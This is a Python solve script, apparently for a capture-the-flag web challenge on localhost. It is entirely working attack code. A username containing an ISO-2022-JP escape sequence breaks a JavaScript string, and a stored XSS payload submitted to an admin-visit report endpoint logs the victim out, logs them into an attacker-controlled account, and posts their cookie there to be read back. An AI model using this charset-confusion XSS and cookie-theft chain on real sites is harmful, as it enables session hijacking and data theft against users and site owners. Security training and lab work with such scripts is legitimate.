import requests
import secrets
import urllib.parse
from time import sleep

URL = 'http://localhost:36368'
sess = requests.Session()

def login(username, password, sess: requests.Session):
    r = sess.post(URL + '/index.php', data={
        'username': username,
        'password': password
    })

def post(content, sess: requests.Session):
    r = sess.post(URL + '/dashboard.php', data={
        'content': content
    })

def report(url):
    r = requests.post(URL + '/report.php', data={
        'url': url
    })

def main():
    username = 'a\x1b(J' + secrets.token_hex(4)
    password = 'f138bd64e11c4425'
    login(username, password, sess)

    content = '''";
        async function login(username, password) {
            const response = await fetch('index.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    'username': username,
                    'password': password
                }),
                credentials: 'same-origin'
            });

            if (response.ok) {
                const result = await response.text();
                console.log('Login successful:', result);
            } else {
                console.error('Login failed:', response.statusText);
            }
        }
        async function createPost(content) {
            const response = await fetch('dashboard.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    'content': content
                }),
                credentials: 'same-origin'
            });

            if (response.ok) {
                const result = await response.text();
                console.log('Post created successfully:', result);
            } else {
                console.error('Failed to create post:', response.statusText);
            }
        }
        async function logout() {
            document.cookie = 'admin=; Max-Age=0';
            const response = await fetch('logout.php', { credentials: 'same-origin' });
            if (response.ok) {
                const result = await response.text();
                console.log('Logout successfully:', result);
            } else {
                console.error('Failed to logout:', response.statusText);
            }
        }
        logout();
        login('retrieve_flag', 'retrieve_flag');
        setTimeout(createPost, 1000, document.cookie);
    //'''
    post(content, sess)

    print(f'{ username = }')
    print(f'{ password = }')

    print(f'{URL}/posts.php?username={urllib.parse.quote(username)}')
    report(f'{URL}/posts.php?username={urllib.parse.quote(username)}')
    sleep(20)

    # logout
    sess.get(URL + '/logout.php')
    login('retrieve_flag', 'retrieve_flag', sess)
    r = sess.get(URL + '/dashboard.php')
    print(r.text)


if __name__ == '__main__':
    main()